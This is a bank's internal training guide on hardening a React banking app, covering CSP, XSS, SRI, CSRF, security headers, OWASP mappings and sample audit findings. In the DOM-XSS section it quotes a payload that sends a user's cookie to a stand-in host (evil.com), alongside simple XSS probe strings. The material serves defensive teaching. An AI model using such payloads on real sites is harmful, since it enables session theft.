# A15 — Security Hardening

> **EastWest Bank — Digital Platforms & Innovations**
>
> Part A (Core) · Level 7 — Production

---

## What You Will Learn

By the end of this guide, you will:

- Implement Content Security Policy (CSP) for XSS prevention
- Debug CSP violation reports and resolve common banking-specific violations
- Use Subresource Integrity (SRI) for third-party scripts
- Understand browser-native XSS prevention mechanisms
- Identify and prevent DOM-based XSS and third-party script risks
- Audit npm dependencies for supply chain attacks
- Prevent common OWASP Top 10 vulnerabilities in React
- Map OWASP Top 10 items to concrete frontend controls for banking SPAs
- Interpret and respond to real security audit findings
- Implement secure input handling and output encoding
- Configure CORS correctly for banking APIs
- Build a security-aware development checklist

---

## Prerequisites

| Requirement | Where |
|------------|-------|
| Completed A13 — Error Handling | Level 6 |
| Completed A14 — Testing Advanced | Level 6 |

---

## Phase 1 — Content Security Policy

### What CSP does

CSP tells the browser which resources are allowed to load and execute. Without
CSP, an XSS vulnerability lets an attacker load any script from any domain.

### CSP directives for banking

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self';
  img-src 'self' data: https://cdn.ewbanking.com;
  connect-src 'self' https://api.ewbanking.com https://*.sentry.io;
  font-src 'self';
  frame-src 'none';
  frame-ancestors 'none';
  form-action 'self';
  base-uri 'self';
  upgrade-insecure-requests;
```

> **Tailwind CSS 4 note:** Tailwind 4 compiles all utility classes to standard
> CSS files at build time — no inline styles are injected at runtime. This means
> `style-src` does **not** need `'unsafe-inline'`. Adding `'unsafe-inline'`
> would weaken your CSP for no benefit. If you use a CSS-in-JS library that
> injects styles at runtime (e.g., Emotion, styled-components), you would need
> `'unsafe-inline'` or nonce-based CSP — but Tailwind 4 does not require it.

| Directive | Value | Purpose |
|-----------|-------|---------|
| `default-src` | `'self'` | Default: only same-origin |
| `script-src` | `'self'` | No inline scripts, no external scripts |
| `style-src` | `'self'` | Tailwind 4 compiles to CSS files — no inline styles |
| `img-src` | `'self' data:` | Same-origin images + data URIs |
| `connect-src` | `'self' + API domains` | API and monitoring endpoints |
| `frame-src` | `'none'` | No iframes allowed |
| `frame-ancestors` | `'none'` | Prevent being iframed (clickjacking) |
| `form-action` | `'self'` | Forms only submit to same origin |
| `base-uri` | `'self'` | Prevent base tag injection |

### CSP reporting

```
Content-Security-Policy-Report-Only:
  default-src 'self';
  report-uri /api/csp-report;
```

Use `Report-Only` during development to identify violations without breaking
the application. Move to enforcing mode after all violations are resolved.

```tsx
// src/lib/csp-report.ts
// Backend endpoint to receive CSP violation reports
// Log violations for BSP 1019 security monitoring
```

### Checkpoint 1

The CSP above uses `style-src 'self'` without `'unsafe-inline'`. What
would adding `'unsafe-inline'` to `style-src` allow an attacker to do?
Under what circumstances would a team legitimately need it (hint: not
with Tailwind CSS 4)?

---

## Phase 1b — CSP Violation Debugging

### Reading a CSP violation report

When the browser blocks a resource that violates your policy, it sends a JSON
report to the endpoint specified in `report-uri`. Here is what a real violation
report looks like:

```json
{
  "csp-report": {
    "document-uri": "https://portal.ewbanking.com/dashboard",
    "referrer": "",
    "violated-directive": "script-src 'self'",
    "effective-directive": "script-src",
    "original-policy": "default-src 'self'; script-src 'self'; report-uri /api/csp-report",
    "blocked-uri": "https://analytics.third-party.com/tracker.js",
    "status-code": 200,
    "source-file": "https://portal.ewbanking.com/dashboard",
    "line-number": 42,
    "column-number": 8
  }
}
```

### Step-by-step debugging

1. **Identify the blocked resource.** Look at `blocked-uri` — this tells you
   exactly which resource was blocked. In this case, a third-party analytics
   script.

2. **Check the violated directive.** The `violated-directive` field shows which
   CSP rule blocked it. Here, `script-src 'self'` means only same-origin
   scripts are allowed.

3. **Find the source.** The `source-file` and `line-number` show where in your
   code the resource was requested. This helps you track down who added it.

4. **Decide: allow or fix.** This is the critical decision:
   - If the resource is legitimate and required, add its domain to the
     appropriate CSP directive.
   - If the resource was injected or is not approved, investigate how it got
     there and remove it.

### Common CSP violations in banking applications

**Inline event handlers from legacy code:**

```html
<!-- VIOLATION: Blocked by script-src 'self' -->
<button onclick="submitTransfer()">Submit</button>

<!-- FIX: Use addEventListener or React's onClick -->
<button onClick={handleSubmitTransfer}>Submit</button>
```

Legacy pages migrated into your SPA may carry inline handlers. These must be
refactored — never weaken CSP to accommodate them.

**Third-party analytics scripts:**

Marketing teams often add tracking pixels and analytics scripts by pasting
`<script>` tags. These will be blocked unless explicitly allowed in CSP.
The correct process is to route these through your security review before
adding the domain to `script-src`.

**Embedded iframes from payment processors:**

Payment processor iframes are legitimate but must be explicitly allowed:

```
frame-src https://tokenizer.payment-processor.com;
```

Do not set `frame-src *` — whitelist only the exact domains your payment
processor uses.

### `report-uri` vs `report-to`

| Feature | `report-uri` | `report-to` |
|---------|-------------|-------------|
| Status | Deprecated but widely supported | Modern replacement |
| Format | Sends individual JSON reports | Uses Reporting API, batched delivery |
| Browser support | All browsers | Chrome, Edge (limited Firefox/Safari) |
| Recommendation | Use both during transition | Will eventually replace `report-uri` |

For production, use both until `report-to` has full browser support:

```
Content-Security-Policy:
  default-src 'self';
  report-uri /api/csp-report;
  report-to csp-endpoint;

Report-To: {"group":"csp-endpoint","max_age":86400,"endpoints":[{"url":"/api/csp-report-v2"}]}
```

### Checkpoint 1b

Your CSP is blocking a third-party analytics script that the marketing team
added to the banking portal. What do you do? (Consider: security review
process, BSP 1019 logging requirements, whether the script is necessary, and
how to add it safely if approved.)

---

## Phase 2 — XSS Prevention in React

### React's built-in protection

React automatically escapes content rendered in JSX:

```tsx
// Safe — React escapes this automatically
const userInput = '<script>alert("XSS")</script>';
return <p>{userInput}</p>;
// Renders: <p>&lt;script&gt;alert("XSS")&lt;/script&gt;</p>
```

### Dangerous patterns to avoid

```tsx
// DANGEROUS — Never use dangerouslySetInnerHTML with user input
<div dangerouslySetInnerHTML={{ __html: userProvidedHtml }} />

// DANGEROUS — Never construct URLs from user input without validation
<a href={userProvidedUrl}>Click here</a>
// An attacker could set: javascript:alert('XSS')

// DANGEROUS — Never use eval() or Function()
eval(userInput);
new Function(userInput)();
```

### Safe patterns

```tsx
// Safe URL handling
function SafeLink({ url, children }: { url: string; children: React.ReactNode }) {
  const isSafeUrl = url.startsWith('https://') || url.startsWith('/');

  if (!isSafeUrl) {
    return <span>{children}</span>;
  }

  return <a href={url}>{children}</a>;
}
```

```bash
# Always use the latest stable version — older versions have known XSS bypass vulnerabilities
npm install dompurify@latest
```

```tsx
// Safe HTML rendering (when absolutely necessary)
import DOMPurify from 'dompurify';

function SafeHtml({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: [],
  });

  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

### Checkpoint 2

A developer needs to render HTML from a CMS (content management system) for
marketing pages on the banking site. What is the safest approach? What tags
and attributes should be allowed?

---

## Phase 2b — DOM-Based XSS and Third-Party Risks

### DOM-based XSS patterns

DOM-based XSS occurs when client-side JavaScript reads data from an
attacker-controllable source and writes it to a dangerous sink — without
the data ever reaching the server. React's JSX escaping does not protect
against all of these.

**Dangerous sources in a banking SPA:**

```tsx
// DANGEROUS — URL fragments and query params
const params = new URLSearchParams(window.location.search);
const redirectUrl = params.get('redirect');
// Attacker sets: ?redirect=javascript:void(document.location='https://evil.com/steal?cookie='+document.cookie)

// DANGEROUS — window.name persists across navigations
const sessionData = window.name;
// Attacker sets window.name on a page they control, then redirects to your app

// DANGEROUS — postMessage without origin validation
window.addEventListener('message', (event) => {
  // If you don't check event.origin, ANY page can send messages
  document.getElementById('output')!.innerHTML = event.data;
});
```

**Safe postMessage handling:**

```tsx
// src/lib/post-message-handler.ts
const TRUSTED_ORIGINS: readonly string[] = [
  'https://tokenizer.payment-processor.com',
  'https://portal.ewbanking.com',
] as const;

window.addEventListener('message', (event: MessageEvent) => {
  if (!TRUSTED_ORIGINS.includes(event.origin)) {
    console.warn(`Rejected postMessage from untrusted origin: ${event.origin}`);
    return;
  }

  // Validate the message shape with Zod before acting on it
  const result = postMessageSchema.safeParse(event.data);
  if (!result.success) {
    console.warn('Rejected malformed postMessage:', result.error.issues);
    return;
  }

  handleTrustedMessage(result.data);
});
```

### Third-party script risks

Every third-party script you load has full access to your page's DOM, cookies
(non-HttpOnly), and localStorage. In a banking application, this means a
compromised third-party script can:

- Read any DOM content, including account numbers and balances
- Capture keystrokes in login and transfer forms
- Exfiltrate session tokens from localStorage
- Modify the DOM to show fake transfer confirmations

**Real-world example:** A third-party customer support chat widget injected a
script that could read DOM content, including masked account numbers that were
unmasked in the DOM but hidden with CSS (`visibility: hidden`). The account
numbers were fully readable to any JavaScript running on the page. An attacker
who compromised the chat widget's CDN could have silently exfiltrated customer
account data.

**Categories of third-party risk:**

| Category | Examples | Risk Level |
|----------|----------|------------|
| Analytics | Google Analytics, Mixpanel, Hotjar | High — full DOM access, keystroke recording |
| Chat widgets | Zendesk, Intercom, LiveChat | High — inject DOM overlays, read page content |
| A/B testing | Optimizely, LaunchDarkly (client-side) | Critical — modifies DOM, can alter transaction flows |
| Error tracking | Sentry, Datadog RUM | Medium — reads stack traces containing data |

### Auditing npm dependencies

Supply chain attacks target the packages you install. A compromised dependency
runs arbitrary code during `npm install` (postinstall scripts) or at runtime.

```bash
# Built-in audit — check for known vulnerabilities
npm audit

# Fail CI builds on high/critical findings
npm audit --audit-level=high

# Investigate a specific package
npm audit --json | jq '.vulnerabilities | to_entries[] | select(.value.severity == "high")'
```

**Additional tools for banking-grade security:**

```bash
# Socket.dev — detects supply chain attacks (typosquatting, install scripts, etc.)
npx socket scan

# Snyk — deeper vulnerability database with fix recommendations
npx snyk test
```

**Supply chain attack scenario:**

1. Attacker publishes `react-data-grid-pro` (typosquatting `react-datagrid-pro`)
2. Package includes a postinstall script that exfiltrates `.env` files
3. At runtime, it intercepts `fetch()` and copies request bodies to an external server
4. All API payloads — including transfer amounts, account numbers, auth tokens — are exfiltrated

**Defenses:**

- Lock dependencies with `package-lock.json` — always commit it
- Review `npm audit` output in every CI build
- Use `--ignore-scripts` during CI installs when possible
- Pin exact versions for critical dependencies (no `^` or `~`)
- Review new dependencies before adding them — check download count,
  maintainers, last publish date, and whether the package has install scripts

### Checkpoint 2b

Your team wants to add a third-party customer support chat widget to the
banking portal. What security review process should this go through before
it is approved? Consider: CSP changes, DOM access, data exposure, BSP 1019
logging, and vendor assessment.

---

## Phase 3 — Subresource Integrity (SRI)

### What SRI protects against

If a CDN is compromised and serves a modified script, SRI detects the
modification and blocks execution:

```html
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-abc123..."
  crossorigin="anonymous"
></script>
```

The browser computes the hash of the downloaded file and compares it to the
`integrity` attribute. If they do not match, the script is blocked.

### SRI with Vite

Vite can generate SRI hashes for output files:

```tsx
// vite.config.ts
import { defineConfig } from 'vite';
import sri from 'vite-plugin-sri';

export default defineConfig({
  plugins: [sri()],
});
```

This automatically adds `integrity` attributes to all `<script>` and `<link>`
tags in the generated `index.html`.

---

## Phase 4 — Secure Input Handling

### Input validation at the boundary

```tsx
// src/lib/sanitize.ts
import { z } from 'zod';

// Strict schemas for all user input
export const usernameSchema = z
  .string()
  .min(3)
  .max(50)
  .regex(/^[a-zA-Z0-9._-]+$/, 'Username contains invalid characters');

export const searchQuerySchema = z
  .string()
  .max(200)
  .transform((val) => val.trim());

export const amountSchema = z
  .number()
  .int('Amount must be in centavos (integer)')
  .positive('Amount must be positive')
  .max(100_000_000, 'Amount exceeds maximum limit'); // Max ₱1,000,000.00 in centavos
```

### PCI-DSS scope reduction

```tsx
// NEVER handle raw card numbers in the frontend
// Use iframe-based tokenization from the payment processor

// src/features/payments/components/card-input.tsx
export function CardInput() {
  return (
    <div>
      <label htmlFor="card-frame">Card Number</label>
      {/* Payment processor's iframe — card data never touches our JavaScript */}
      <iframe
        id="card-frame"
        src="https://tokenizer.payment-processor.com/card-input"
        title="Secure card input"
        className="h-12 w-full rounded border"
      />
      <p className="text-xs text-gray-500">
        Card data is handled securely by our payment processor.
      </p>
    </div>
  );
}
```

> **PCI-DSS:** By using iframe-based tokenization, the frontend never handles
> raw card numbers (PAN). This reduces PCI-DSS scope to SAQ A — the simplest
> compliance level.

---

## Phase 5 — CSRF Protection

### What CSRF is

Cross-Site Request Forgery (CSRF) tricks an authenticated user's browser into
making unwanted requests. If your session relies on cookies (including the
HttpOnly refresh token), a malicious page can forge requests to your API.

```
1. User logs into banking portal (session cookie set)
2. User visits malicious site in another tab
3. Malicious site sends: POST /api/transfers { to: "attacker", amount: 50000 }
4. Browser attaches the session cookie automatically
5. Server processes the transfer — it looks legitimate
```

### CSRF protection strategies for SPAs

**Strategy 1: SameSite cookies (primary defense)**

```
Set-Cookie: ewb_session=...; HttpOnly; Secure; SameSite=Strict; Path=/api/auth
```

`SameSite=Strict` prevents the browser from sending the cookie on cross-site
requests. This is the strongest protection and works in all modern browsers.

**Strategy 2: CSRF token (defense in depth)**

For sensitive operations (transfers, password changes), use a server-issued
CSRF token in addition to SameSite cookies:

```tsx
// src/lib/api-client.ts
// Request a CSRF token before sensitive operations
async function getCsrfToken(): Promise<string> {
  const response = await apiClient.get('/auth/csrf-token');
  return response.data.token;
}

// Include it in mutation requests
async function createTransfer(payload: TransferRequest): Promise<TransferResponse> {
  const csrfToken = await getCsrfToken();
  const response = await apiClient.post('/transfers', payload, {
    headers: { 'X-CSRF-Token': csrfToken },
  });
  return transferResponseSchema.parse(response.data);
}
```

**Strategy 3: Check Origin header (server-side)**

The server should verify that the `Origin` or `Referer` header matches the
expected domain for all state-changing requests.

### Checkpoint 5

A developer argues that CSRF is not a problem for SPAs because "we use Bearer
tokens, not cookies." Under what circumstances is this wrong? (Hint: think about
the refresh token.)

---

## Phase 6 — Additional Security Headers

### Permissions-Policy

Restricts which browser features your application can use. Banking apps should
not need camera, microphone, or geolocation access:

```
Permissions-Policy:
  camera=(),
  microphone=(),
  geolocation=(),
  payment=(),
  usb=()
```

| Feature | Setting | Why |
|---------|---------|-----|
| `camera=()` | Disabled | Banking portal does not use the camera |
| `microphone=()` | Disabled | No audio features |
| `geolocation=()` | Disabled | Location not needed (if needed, allow `self` only) |
| `payment=()` | Disabled | Payment Request API handled by tokenization iframe |
| `usb=()` | Disabled | No USB device access |

Add this header alongside your other security headers in the deployment
configuration (Azure Front Door or the application itself).

### Content-Type validation

Always verify that API responses are actually JSON before parsing:

```tsx
// In your API client interceptor
apiClient.interceptors.response.use((response) => {
  const contentType = response.headers['content-type'];
  if (contentType != null && !contentType.includes('application/json')) {
    // A non-JSON response could be a sign of a proxy injection or
    // misconfigured server returning HTML error pages
    throw new Error(`Unexpected Content-Type: ${contentType}`);
  }
  return response;
});
```

This prevents scenarios where a compromised proxy serves an HTML page containing
malicious scripts instead of the expected JSON response.

---

## Phase 6b — OWASP Top 10 for React Banking Apps

The OWASP Top 10 (2021) is the industry standard classification of web
application security risks. While several items are primarily backend concerns,
every item has frontend implications in a banking SPA. This section maps each
relevant item to concrete React controls you must implement.

### OWASP mapping table

| # | OWASP Item | Frontend Control | Test / Verification |
|---|-----------|-----------------|-------------------|
| A01 | Broken Access Control | RBAC route guards, component-level permission checks, API authorization headers | Attempt to access admin routes as regular user; verify redirect |
| A02 | Cryptographic Failures | HTTPS-only, no secrets in client code, SRI on external resources | Scan bundle output for API keys; verify SRI hashes |
| A03 | Injection | CSP, Zod input validation, DOMPurify for HTML rendering | CSP violation reports; fuzz input fields with injection payloads |
| A05 | Security Misconfiguration | Security headers present, debug mode disabled, error pages sanitized | Automated header scan; verify no stack traces in production errors |
| A07 | Cross-Site Scripting | React auto-escaping, DOMPurify, CSP script-src without unsafe-inline | Inject `<script>` tags in all input fields; verify CSP blocks inline scripts |
| A08 | Insecure Deserialization | Zod validation of all API responses and external data | Send malformed JSON; verify Zod rejects it before the app processes it |
| A09 | Security Logging & Monitoring Failures | CSP violation reports, audit trail for sensitive actions, error monitoring | Verify CSP reports reach the logging endpoint; check audit trail completeness |

### A01 — Broken Access Control

The frontend is never the source of truth for access control — the API must
enforce permissions. But the frontend must also enforce route guards to prevent
users from seeing UI they should not access, and to provide clear feedback
when access is denied.

```tsx
// src/components/auth/role-guard.tsx — same component from B02/B04
import { Navigate } from 'react-router';
import { useAuthStore } from '@/stores/auth-store';
import { hasMinimumRole } from '@/lib/permissions';
import type { Role } from '@/types/auth';

interface RoleGuardProps {
  requiredRole: Role;
  children: React.ReactNode;
}

export function RoleGuard({ requiredRole, children }: RoleGuardProps) {
  const user = useAuthStore((s) => s.user);

  if (!user) {
    return <Navigate to="/login" replace />;
  }

  if (!hasMinimumRole(user.role, requiredRole)) {
    // Log the unauthorized access attempt (BSP 1019)
    console.warn(`Access denied: user ${user.id} attempted to access role-restricted route`);
    return <Navigate to="/unauthorized" replace />;
  }

  return <>{children}</>;
}
```

This is the same `RoleGuard` from B02 and `RoleRoute` from B04, using
`hasMinimumRole()` for hierarchical checks. The BSP audit logging is the
new addition — always log denied access attempts for compliance.

Even with route guards, every API call must include authorization headers,
and the backend must independently verify permissions. The frontend guard
is UX — the backend guard is security.

### Permissions utility

The `RequireRole` component above checks a flat list of role strings. For
more granular control, build a permissions module that models the role
hierarchy and maps roles to specific capabilities:

```tsx
// src/lib/permissions.ts
import type { Role } from '@/types/auth';

const roleHierarchy: Record<Role, number> = {
  customer: 0,
  teller: 1,
  manager: 2,
  admin: 3,
};

export function hasMinimumRole(userRole: Role, requiredRole: Role): boolean {
  return roleHierarchy[userRole] >= roleHierarchy[requiredRole];
}

export function canAccessRoute(userRole: Role, routeRoles: Role[]): boolean {
  return routeRoles.some((role) => hasMinimumRole(userRole, role));
}

type Permission =
  | 'accounts:read'
  | 'accounts:write'
  | 'transfers:create'
  | 'transfers:approve'
  | 'users:manage'
  | 'reports:view'
  | 'settings:manage';

const rolePermissions: Record<Role, Set<Permission>> = {
  customer: new Set(['accounts:read']),
  teller: new Set(['accounts:read', 'accounts:write', 'transfers:create']),
  manager: new Set([
    'accounts:read', 'accounts:write', 'transfers:create',
    'transfers:approve', 'reports:view',
  ]),
  admin: new Set([
    'accounts:read', 'accounts:write', 'transfers:create',
    'transfers:approve', 'users:manage', 'reports:view', 'settings:manage',
  ]),
};

export function hasPermission(role: Role, permission: Permission): boolean {
  const perms = rolePermissions[role];
  if (!perms) return false;
  return perms.has(permission);
}
```

This module separates two concerns:

- **Role hierarchy** (`hasMinimumRole`) — A manager can do anything a teller
  can do. Useful for route-level guards where "manager or above" is the rule.
- **Granular permissions** (`hasPermission`) — A teller can create transfers
  but not approve them. Useful for hiding individual UI actions (buttons,
  menu items) based on the user's specific capabilities.

The `RequireRole` component from above handles route access. For component-level
permission checks, use `hasPermission` directly:

```tsx
// In any component
import { hasPermission } from '@/lib/permissions';
import { useAuthStore } from '@/stores/auth-store';

function TransferActions() {
  const role = useAuthStore((s) => s.user?.role);

  return (
    <div>
      {role && hasPermission(role, 'transfers:create') && (
        <button>New Transfer</button>
      )}
      {role && hasPermission(role, 'transfers:approve') && (
        <button>Approve Pending</button>
      )}
    </div>
  );
}
```

### A02 — Cryptographic Failures

```tsx
// NEVER store secrets in client-side code
// These VITE_ variables are embedded in the bundle and visible to anyone

// BAD — secret exposed in the browser
const API_SECRET = import.meta.env.VITE_API_SECRET; // Visible in bundle

// GOOD — only non-secret configuration in VITE_ variables
const API_BASE = import.meta.env.VITE_API_BASE_URL; // Public URL, not a secret
```

Verify no secrets leak into the production bundle:

```bash
# Search the built output for common secret patterns
grep -r "SECRET\|PASSWORD\|PRIVATE_KEY\|api_key" dist/ && echo "SECRETS FOUND IN BUNDLE" && exit 1
```

### A03 — Injection

The frontend cannot prevent SQL injection (that is a backend responsibility),
but it must never construct raw queries or pass unsanitized input to APIs
that might interpolate it:

```tsx
// BAD — constructing a filter string that the backend might interpolate
const query = `SELECT * FROM accounts WHERE name = '${userInput}'`;

// GOOD — send structured data, let the backend use parameterized queries
const response = await apiClient.get('/accounts', {
  params: { name: searchQuerySchema.parse(userInput) },
});
```

CSP provides the strongest frontend defense against injection — it prevents
injected scripts from executing even if they reach the DOM.

### A05 — Security Misconfiguration

Production builds must disable all debugging features:

```tsx
// vite.config.ts — production safety
export default defineConfig({
  build: {
    // Remove console.log in production
    minify: 'terser',
    terserOptions: {
      compress: {
        drop_console: true,
        drop_debugger: true,
      },
    },
  },
});
```

> **Note:** Vite uses esbuild for minification by default. To use Terser (needed for `drop_console`), install it: `npm install -D terser`. Alternatively, use esbuild's built-in drop: `esbuild: { drop: ['console', 'debugger'] }` which works without extra dependencies.

Error pages must never expose stack traces, file paths, or internal
architecture details. Use generic error messages in production (see A13).

### A07 — Cross-Site Scripting

Covered in depth in Phase 2 and Phase 2b. The layered defense is:

1. React's automatic escaping (first line of defense)
2. DOMPurify for any HTML that must be rendered (second line)
3. CSP blocking inline scripts and unauthorized external scripts (third line)
4. Input validation with Zod at all boundaries (fourth line)

### A08 — Insecure Deserialization

In a React SPA, "deserialization" means parsing API responses, URL parameters,
localStorage data, and postMessage payloads. All of these are untrusted input.

```tsx
// src/lib/api-client.ts
import { z } from 'zod';

// Every API response MUST be validated with Zod (BSP 1122)
const accountResponseSchema = z.object({
  id: z.string().uuid(),
  accountNumber: z.string().regex(/^\d{10,12}$/),
  balance: z.number().int().nonnegative(),
  currency: z.literal('PHP'),
  status: z.enum(['active', 'frozen', 'closed']),
});

type AccountResponse = z.infer<typeof accountResponseSchema>;

export async function getAccount(id: string): Promise<AccountResponse> {
  const response = await apiClient.get(`/accounts/${id}`);
  return accountResponseSchema.parse(response.data);
}
```

### A09 — Security Logging and Monitoring Failures

BSP Circular 1019 requires comprehensive logging of security events. On the
frontend, this means:

- CSP violation reports sent to a monitored endpoint
- Failed authentication attempts logged with timestamps
- Unauthorized route access attempts captured
- Session expiration events tracked

```tsx
// src/lib/security-logger.ts (extend error-logger.ts in companion repo)
export function logSecurityEvent(event: {
  type: 'csp_violation' | 'auth_failure' | 'unauthorized_access' | 'session_expired';
  details: Record<string, unknown>;
}): void {
  // Send to backend logging endpoint — never log PII
  void apiClient.post('/api/security-events', {
    ...event,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
  });
}
```

### Items primarily handled by the backend

| # | OWASP Item | Why it is backend-focused | Frontend awareness |
|---|-----------|--------------------------|-------------------|
| A04 | Insecure Design | Architecture-level concern | Follow secure design patterns in this guide |
| A06 | Vulnerable and Outdated Components | Dependency management | Run `npm audit` in CI (see Phase 2b) |
| A10 | Server-Side Request Forgery (SSRF) | Server-side only | No frontend control, but never send user-controlled URLs to the backend without validation |

These items exist and your backend team must address them. As frontend
developers, your responsibility is to understand them and not introduce
patterns that make backend exploitation easier.

---

## Phase 6c — What Audit Findings Look Like

Security audits are a regular part of banking compliance. BSP examiners and
third-party auditors will test your application and produce findings in a
standard format. Knowing what these look like helps you fix issues quickly
and prevents surprises during examination.

### Finding: CSP Allows unsafe-eval

**Severity:** High

**Description:** The Content Security Policy includes `'unsafe-eval'` in the
`script-src` directive, which allows the execution of dynamically constructed
JavaScript code. This significantly weakens XSS protections.

**Evidence:** HTTP response header observed:
`Content-Security-Policy: script-src 'self' 'unsafe-eval'`

**Impact:** An attacker who achieves limited XSS can escalate to full code
execution by using `eval()`, `setTimeout('string')`, or `new Function()`.
In a banking context, this could allow unauthorized fund transfers, session
hijacking, or customer data exfiltration.

**Remediation:** Remove `'unsafe-eval'` from `script-src`. Audit all
JavaScript code for `eval()`, `new Function()`, or string-based
`setTimeout`/`setInterval` calls and replace them with safe alternatives.
Ensure no npm dependencies require `eval()` at runtime.

**Verification:** Rescan the response headers. Confirm `'unsafe-eval'` is
absent. Run the application and verify no functionality is broken.

---

### Finding: Missing Permissions-Policy Header

**Severity:** Medium

**Description:** The application does not set a `Permissions-Policy` header,
allowing the page (and any embedded third-party content) to request access to
sensitive browser features such as camera, microphone, and geolocation.

**Evidence:** HTTP response headers do not include `Permissions-Policy`.
Verified with: `curl -I https://portal.ewbanking.com | grep -i permissions`

**Impact:** A compromised third-party script or XSS exploit could request
camera or microphone access, potentially recording the user without consent.
While browser permission prompts provide some protection, the absence of the
policy header means the capability is not explicitly denied at the HTTP level.

**Remediation:** Add the following header to all responses:
`Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=()`
Configure this in Azure Front Door or the application's response headers.

**Verification:** Rescan response headers. Confirm `Permissions-Policy` is
present and disables unused features.

---

### Finding: PII Visible in Browser Console Logs

**Severity:** High

**Description:** Customer personally identifiable information (PII) including
full names and email addresses is logged to the browser console during normal
application operation. This data is accessible to any JavaScript running on
the page, including third-party scripts.

**Evidence:** Opening browser DevTools on the account details page shows:
`[AccountService] Loaded account for: Juan Dela Cruz (juan.delacruz@email.com)`
This was observed in the production build.

**Impact:** Any third-party script with DOM access can read console output.
If a third-party analytics or chat widget is compromised, it could harvest
customer PII. This violates BSP Circular 1019 data protection requirements
and the Data Privacy Act of 2012.

**Remediation:** Remove all `console.log` statements that output PII. In
production builds, strip console statements entirely using Terser
configuration. For necessary debugging, use opaque identifiers (user ID,
account reference number) instead of names, emails, or account numbers.

**Verification:** Build the production bundle and search the output for
`console.log`. Run the application and verify no PII appears in DevTools.

---

### Finding: Third-Party Scripts Loaded Without SRI

**Severity:** Medium

**Description:** External JavaScript files are loaded from CDN domains without
Subresource Integrity (SRI) hashes. If the CDN is compromised, modified scripts
will execute without detection.

**Evidence:** HTML source contains:
`<script src="https://cdn.example.com/analytics.js"></script>`
No `integrity` attribute is present on the tag.

**Impact:** A CDN compromise (or DNS hijack) could serve a modified script
that captures user input, including credentials and transaction details. The
browser would execute the modified script without warning.

**Remediation:** Add `integrity` and `crossorigin` attributes to all external
script and stylesheet tags. Use the `vite-plugin-sri` plugin for build-time
assets. For runtime-loaded external scripts, compute and pin SRI hashes as
part of the deployment process.

**Verification:** Inspect the HTML source for all `<script>` and `<link>` tags.
Confirm every external resource has a valid `integrity` attribute. Modify a
cached script file and verify the browser blocks it.

---

### Finding: Session Timeout Not Enforced on Sensitive Pages

**Severity:** High

**Description:** The application does not enforce session timeout on pages
that display or process sensitive financial data. A user who walks away from
their workstation remains authenticated indefinitely until the server-side
session expires.

**Evidence:** Opened the fund transfer page, left the browser idle for 30
minutes, and was able to submit a transfer without re-authentication. BSP
Circular 982 requires session timeout and re-authentication for sensitive
operations.

**Impact:** An unattended workstation with an active banking session is a
direct path to unauthorized transactions. In branch or back-office
environments, this is a significant operational risk.

**Remediation:** Implement an idle timeout that locks the session after a
configurable period (recommended: 5 minutes for transaction pages, 15 minutes
for read-only pages). On timeout, require re-authentication before allowing
further actions. Implement an activity monitor that tracks mouse, keyboard,
and touch events.

```tsx
// src/hooks/use-session-timeout.ts (companion repo uses this path)
import { useEffect, useRef } from 'react';

export function useIdleTimeout(timeoutMs: number, onTimeout: () => void): void {
  const timerRef = useRef<ReturnType<typeof setTimeout>>();

  useEffect(() => {
    const resetTimer = () => {
      if (timerRef.current) {
        clearTimeout(timerRef.current);
      }
      timerRef.current = setTimeout(onTimeout, timeoutMs);
    };

    const events: Array<keyof WindowEventMap> = [
      'mousedown', 'keydown', 'touchstart', 'scroll',
    ];

    events.forEach((event) => window.addEventListener(event, resetTimer));
    resetTimer(); // Start the timer

    return () => {
      events.forEach((event) => window.removeEventListener(event, resetTimer));
      if (timerRef.current) {
        clearTimeout(timerRef.current);
      }
    };
  }, [timeoutMs, onTimeout]);
}
```

**Verification:** Set the idle timeout to 5 minutes. Leave the session idle
and confirm the application locks and requires re-authentication. Verify that
user activity (mouse, keyboard) resets the timer.

---

## Phase 7 — Security Checklist

### Development security checklist

| Check | Details |
|-------|---------|
| No `dangerouslySetInnerHTML` with user data | Sanitize with DOMPurify if needed |
| No `eval()` or `new Function()` | Use safe alternatives |
| No secrets in `VITE_*` environment variables | Secrets stay on the backend |
| No PII in logs or error messages | Use IDs, not names/emails |
| All API responses validated with Zod | BSP 1122 |
| Auth tokens in memory only | BSP 982 |
| CSP headers configured | A15 Phase 1 |
| CSP violation reports monitored | A15 Phase 1b — route reports to BSP 1019 logging |
| SRI on external resources | A15 Phase 3 |
| No raw card numbers in JavaScript | PCI-DSS |
| `rel="noopener noreferrer"` on external links | Prevent tab-napping |
| HTTPS everywhere | `upgrade-insecure-requests` in CSP |
| Clickjacking protection | `X-Frame-Options: DENY` |
| CSRF protection | `SameSite=Strict` on cookies + CSRF tokens for transfers |
| Permissions-Policy header | Restrict camera, microphone, geolocation, payment, USB |
| Content-Type validation | Reject non-JSON responses from API endpoints |
| postMessage origin validation | Only accept messages from trusted origins (Phase 2b) |
| Third-party scripts reviewed and approved | Security review before adding any external script |
| npm dependencies audited | `npm audit` in CI, fail on high/critical (Phase 2b) |
| No DOM-based XSS sinks | No unvalidated use of `document.location`, `window.name`, `innerHTML` |
| RBAC route guards in place | Frontend enforces role-based access (A01) |
| No secrets in production bundle | Scan `dist/` output for key patterns (A02) |
| Console statements stripped in production | Terser `drop_console` enabled (A05) |
| Zod validation on all external data | API responses, URL params, postMessage, localStorage (A08) |
| Security events logged | CSP violations, auth failures, unauthorized access (BSP 1019) |
| Session idle timeout enforced | 5 min for transactions, 15 min for read-only (BSP 982) |
| Supply chain defenses active | Lockfile committed, exact pins for critical deps (Phase 2b) |
| OWASP Top 10 controls mapped | All applicable items addressed (Phase 6b) |

---

## Key Takeaways

1. **CSP is the primary XSS defense** beyond React's built-in escaping.
   Configure it strictly and monitor violations.

2. **React escapes by default** — but `dangerouslySetInnerHTML`, `href`,
   and `eval()` bypass this protection. Avoid them with user input.

3. **SRI** protects against compromised CDNs. Use it for all external
   resources.

4. **Never handle raw card numbers** in frontend JavaScript. Use
   iframe-based tokenization for PCI-DSS scope reduction.

